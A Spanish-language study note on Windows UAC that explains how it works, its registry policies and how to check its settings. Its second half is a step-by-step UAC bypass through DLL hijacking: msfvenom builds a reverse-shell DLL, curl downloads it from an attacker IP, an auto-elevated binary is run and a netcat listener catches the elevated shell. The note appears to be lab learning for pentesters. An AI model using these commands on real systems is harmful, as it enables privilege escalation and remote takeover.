
# Elevación de Privilegios en Windows - UAC (User Account Control)

## ¿Qué es el UAC?
User Account Control (UAC) es una característica de seguridad de Windows que muestra una solicitud de consentimiento cuando una aplicación intenta realizar tareas que requieren privilegios de administrador. Su propósito es proteger a los usuarios de cambios no autorizados en el sistema.

- Las aplicaciones se ejecutan con niveles de integridad distintos.
- Aunque estés en el grupo de administradores, tus procesos se ejecutan con un token no privilegiado hasta que confirmas la elevación.

## Cómo funciona el UAC
- Al iniciar sesión, se asignan dos tokens: uno estándar y uno privilegiado (si el usuario es administrador).
- Al ejecutar una aplicación con elevación, Windows muestra el prompt de UAC para usar el token privilegiado.

## Políticas de Grupo Relacionadas con UAC

| Configuración                                              | Clave de Registro             | Valor por defecto                         |
| ---------------------------------------------------------- | ----------------------------- | ----------------------------------------- |
| Admin Approval Mode para el admin por defecto              | `FilterAdministratorToken`    | Desactivado                               |
| Permitir que apps UIAccess se eleven sin escritorio seguro | `EnableUIADesktopToggle`      | Desactivado                               |
| Comportamiento del prompt para administradores             | `ConsentPromptBehaviorAdmin`  | Solicitar consentimiento                  |
| Comportamiento del prompt para usuarios estándar           | `ConsentPromptBehaviorUser`   | Solicitar credenciales                    |
| Detectar instalaciones y pedir elevación                   | `EnableInstallerDetection`    | Activado (home), Desactivado (enterprise) |
| Elevar solo ejecutables firmados                           | `ValidateAdminCodeSignatures` | Desactivado                               |
| Elevar solo apps UIAccess en ubicaciones seguras           | `EnableSecureUIAPaths`        | Activado                                  |
| Ejecutar admins en modo de aprobación                      | `EnableLUA`                   | Activado                                  |
| Cambiar al escritorio seguro al solicitar elevación        | `PromptOnSecureDesktop`       | Activado                                  |
| Virtualizar escritura en archivos y registro por usuario   | `EnableVirtualization`        | Activado                                  |

## Verificar si UAC está activado

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```
- `0x1` → UAC activado

También puedes revisar el nivel del prompt:

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```
- `0x5` → Nivel más estricto: Siempre Notificar

## Bypass de UAC con DLL Hijacking

### Contexto
- Windows versión: 10.0.14393 (build 1607)
- Binario autoelevado vulnerable: `SystemPropertiesAdvanced.exe` de 32 bits
- Carga la DLL inexistente `srrstr.dll`

### Paso a paso

#### 1. Crear DLL maliciosa con reverse shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

#### 2. Subir DLL al sistema objetivo

```powershell
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

#### 3. Ejecutar la DLL para probar conexión

```cmd
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

#### 4. Limpiar procesos previos

Ver todos los procesos rundell32.exe y con el comando `taskkill /PID <PID> /F ir cerrándolos.`

```cmd
tasklist /svc | findstr "rundll32"
taskkill /PID <PID> /F
```

#### 5. Ejecutar binario vulnerable

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

#### 6. Shell obtenida (con privilegios elevados)

```bash
nc -lvnp 8443
```

Dentro de la shell:

```cmd
whoami
whoami /priv
```

> Verás privilegios elevados disponibles como `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc.

## Conclusión
El UAC no es una frontera de seguridad infalible, pero añade una capa de protección. Entender cómo funciona y cómo se puede evadir es clave para pentesters y defensores. Técnicas como DLL hijacking con binarios autoelevados son efectivas en versiones vulnerables de Windows.

## Recursos útiles

- [UACMe - Técnicas de bypass](https://github.com/hfiref0x/UACME)
- [Lista de builds de Windows y codenames](https://learn.microsoft.com/en-us/windows/release-health/release-information)
